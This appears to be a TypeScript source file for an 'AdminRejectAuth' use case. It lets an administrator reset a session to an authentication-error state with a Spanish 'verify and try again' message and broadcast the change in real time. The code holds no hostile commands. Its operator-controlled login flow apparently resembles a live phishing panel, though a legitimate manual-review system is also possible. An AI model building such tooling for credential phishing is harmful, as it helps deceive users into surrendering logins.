import { ActionState } from "@prisma/client";
import { type SessionRepository } from "../ports/SessionRepository.js";
import { type RealtimeGateway } from "../ports/RealtimeGateway.js";
import { SessionPolicy } from "../../domain/session/SessionPolicy.js";

export class AdminRejectAuth {
  constructor(private repo: SessionRepository, private rt: RealtimeGateway) {}

  async execute(input: { sessionId: string; message?: string }) {
    const s = await this.repo.findById(input.sessionId);
    if (!s) return { ok: false as const, error: "not_found" };

    if (!SessionPolicy.canAdminRejectAuth(s.action)) {
      return { ok: false as const, error: "bad_state" };
    }

    await this.repo.update(input.sessionId, {
      action: ActionState.AUTH_ERROR,
      step: "1",
      lastError: (input.message?.trim() || "Error. Verifica e intenta nuevamente."),
    });

    const updated = await this.repo.findById(input.sessionId);
    if (updated) {
      this.rt.emitSessionUpdate(input.sessionId, updated);
      this.rt.emitAdminUpsert(updated);
    }

    return { ok: true as const };
  }
}